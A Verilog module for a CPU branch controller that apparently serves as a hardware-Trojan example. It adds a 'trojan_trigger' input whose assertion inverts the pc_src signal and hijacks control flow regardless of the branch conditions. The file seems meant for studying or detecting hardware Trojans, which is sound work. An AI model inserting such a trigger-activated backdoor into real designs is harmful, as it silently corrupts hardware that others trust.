 module Branch_CTLR (
    input [2:0] branch_in,
    input zero_flag, sign_flag,
    // Hypothetical Trojan trigger input
    input trojan_trigger, // An external signal that activates the Trojan
    output reg pc_src
);

    wire BEQ, BNQ, BLT, BGT;
    
    always@(branch_in, BEQ, BNQ, BLT, BGT, trojan_trigger) begin
        // Normal behavior
        case (branch_in)
            3'b001: pc_src = BEQ; // branch equal
            3'b010: pc_src = BNQ; // branch not equal
            3'b011: pc_src = BLT; // branch less than
            3'b100: pc_src = BGT; // branch greater than
            3'b101: pc_src = 1'b1; // JALR
            3'b110: pc_src = 1'b1; // JAL
            default: pc_src = 1'b0;
        endcase
        
        // Trojan behavior
        if (trojan_trigger) begin
            // Hypothetical payload: forcibly redirect the control flow, ignoring actual conditions
            pc_src = !pc_src; // Inverts the expected behavior as an example of malicious action
        end
    end
    
    assign BEQ = zero_flag ? 1'b1 : 1'b0;
    assign BNQ = zero_flag ? 1'b0 : 1'b1;
    assign BLT = sign_flag ? 1'b1 : 1'b0;
    assign BGT = sign_flag ? 1'b0 : 1'b1;

endmodule
